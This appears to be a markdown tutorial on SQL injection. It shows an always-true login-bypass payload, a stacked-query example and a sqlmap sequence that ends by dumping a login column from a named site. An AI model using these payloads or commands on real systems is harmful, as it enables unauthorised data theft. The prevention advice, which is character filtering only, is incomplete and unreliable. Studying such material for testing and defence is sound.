# SQL Injection

SQL injection attack consists of insertion of either a partial or complete SQL query via the data input from the client (Browser) to Application (Server).

## SQL Injection Technique

-	***Union Operator:*** can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.
-	***Boolean:*** use Boolean condition(s) to verify whether certain conditions are true or false.
-	***Error based:*** this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.
-	***Out-of-band:*** technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).
-	***Time delay:*** use database commands (e.g. sleep) to delay answers in conditional queries. It useful when attacker doesn’t have some kind of answer (result, output, or error) from the application

## Standard SQL Injection Testing

### Example 1 (classical SQL Injection):
Consider the following SQL query:
```
SELECT * FROM Users WHERE Username='$username' AND Password='$password'
$username = 1' or '1' = '1
$password = 1' or '1' = '1
The query will be:
SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1' 
```

### Example 2 (simple SELECT statement):
Consider the following SQL query: 
```
SELECT * FROM products WHERE id_product=$id_product
http://www.example.com/product.php?id=10
```

### Example 3 (Stacked queries):
Consider the following SQL query: 
```
SELECT * FROM products WHERE id_product=$id_product
http://www.example.com/product.php?id=10; INSERT INTO users (…)
```

![image](https://user-images.githubusercontent.com/65315090/129912785-f84232fc-a41a-4520-92fa-6c7dfe803e70.png)

![image](https://user-images.githubusercontent.com/65315090/129912819-124fbe54-d140-4133-8a99-0a3092ba3b15.png)

## Tools for SQL Injection

### [SQLMap](https://sqlmap.org/)

**Step-1:** Find Current Database name
  `sqlmap –u http://www.nayan.com/item_id=3 --level=5 --risk=3 --current-db --batch`

**Step-2:** List DBMS database
  `sqlmap –u http://www.nayan.com/item_id=3 --dbs`

**Step-3:** List Tables
  `sqlmap –u http://www.nayan.com/item_id=3 –D tablename --tables`
  
**Step-4:** List columns on tables
	`sqlmap –u http://www.nayan.com/item_id=3 –D tablename –T user_info --columns`
  
**Step-5:** List column data from columns
  `sqlmap –u http://www.nayan.com/item_id=3 –D tablename –T user_info –C login --dump`

- More Information: https://www.owasp.org/index.php/SQL_Injection

## Prevent SQL injection
Filter out character like ' " - / \ ; NULL, etc. in all strings from:
- Input from users
- Parameters from URL
- Values from cookie

- Mitigation: https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet

